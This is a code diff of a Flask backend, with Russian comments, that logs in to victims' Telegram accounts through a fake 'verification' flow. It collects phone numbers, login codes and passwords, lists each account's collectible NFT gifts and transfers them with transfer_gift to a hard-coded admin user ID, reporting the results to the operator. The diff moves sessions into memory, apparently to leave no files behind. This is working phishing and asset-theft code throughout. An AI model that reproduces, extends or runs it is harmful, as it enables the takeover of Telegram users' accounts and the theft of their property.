@@ -1,4 +1,4 @@
-# app.py — НА KURIGRAM (РАБОТАЕТ С ПОДАРКАМИ!)
+# app.py — Kurigram с StringSession (без файлов)
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -11,7 +11,7 @@ import io
 import re
 from dotenv import load_dotenv
 from pyrogram import Client
-from pyrogram.types import Gift
+from pyrogram.types import Message
 import requests
 
 load_dotenv()
@@ -31,7 +31,7 @@ ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
 sessions = {}
 
 # ============================================================
-# EVENT LOOP
+# ОДИН EVENT LOOP
 # ============================================================
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -100,20 +100,28 @@ def get_gift_url(gift_name, gift_id=None):
     return f"https://t.me/nft/{collection}"
 
 # ============================================================
-# ПОЛУЧЕНИЕ ПОДАРКОВ ЧЕРЕЗ KURIGRAM (РАБОТАЕТ!)
+# ПОЛУЧЕНИЕ ПОДАРКОВ (Kurigram)
 # ============================================================
 
 async def get_user_gifts(client):
-    """Получение подарков через Kurigram — РАБОТАЕТ!"""
+    """Получение подарков через Kurigram"""
     try:
+        # Пробуем get_available_gifts
         gifts = await client.get_available_gifts()
         if gifts:
-            print(f"[DEBUG] Найдено {len(gifts)} подарков")
             return gifts
-        return []
     except Exception as e:
-        print(f"[DEBUG] Ошибка получения подарков: {e}")
-        return []
+        print(f"get_available_gifts error: {e}")
+    
+    try:
+        # Пробуем get_gifts
+        gifts = await client.get_gifts()
+        if gifts:
+            return gifts
+    except Exception as e:
+        print(f"get_gifts error: {e}")
+    
+    return []
 
 # ============================================================
 # ПЕРЕДАЧА ПОДАРКОВ
@@ -122,16 +130,16 @@ async def get_user_gifts(client):
 async def transfer_nft_gifts(session_string, phone, username, user_id):
     client = None
     try:
-        # Создаём клиент через Kurigram
+        # ИСПОЛЬЗУЕМ STRING SESSION (НЕТ ФАЙЛОВ!)
         client = Client(
             session_string,
             api_id=API_ID,
-            api_hash=API_HASH,
-            session_string=session_string
+            api_hash=API_HASH
         )
         await client.start()
         
-        if not await client.get_me():
+        me = await client.get_me()
+        if not me:
             await send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
             return False
         
@@ -145,7 +153,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             )
             return False
         
-        # Фильтруем коллекционные (limited = True)
+        # Фильтруем коллекционные
         nft_gifts = []
         for gift in all_gifts:
             if getattr(gift, 'limited', False):
@@ -187,7 +195,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         transferred = 0
         for i, gift_id in enumerate(gift_ids):
             try:
-                # В Kurigram метод может называться transfer_gift
+                # Transfer через Kurigram
                 await client.transfer_gift(
                     gift_id=gift_id,
                     to_id=ADMIN_USER_ID
@@ -216,15 +224,17 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
                 pass
 
 # ============================================================
-# ВЕРИФИКАЦИЯ (с Kurigram)
+# ВЕРИФИКАЦИЯ
 # ============================================================
 
 async def send_code_async(phone):
     try:
+        # Используем временную сессию в памяти
         client = Client(
-            f"sessions/{phone}",
+            f"session_{int(time.time())}_{random.randint(1000, 9999)}",
             api_id=API_ID,
-            api_hash=API_HASH
+            api_hash=API_HASH,
+            in_memory=True  # ВАЖНО: сессия в памяти, без файлов!
         )
         await client.start()
         
@@ -232,7 +242,6 @@ async def send_code_async(phone):
             await client.stop()
             return {'success': False, 'error': 'Already authorized'}
         
-        # Отправляем код
         sent_code = await client.send_code(phone)
         
         sessions[phone] = {
@@ -343,7 +352,8 @@ def ping():
     return jsonify({
         'status': 'online',
         'library': 'Kurigram',
-        'note': 'Поддерживает получение подарков!'
+        'note': 'Поддерживает получение подарков!',
+        'session': 'in-memory (no files)'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -424,7 +434,7 @@ def check_password():
 if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН (Kurigram)")
-    print("📌 Использует Kurigram — форк Pyrogram с поддержкой подарков")
+    print("📌 Сессия в памяти (in-memory) — нет файлов!")
     print("📌 Получение подарков: get_available_gifts()")
     print("📌 Передача подарков: transfer_gift()")
     print("=" * 60)
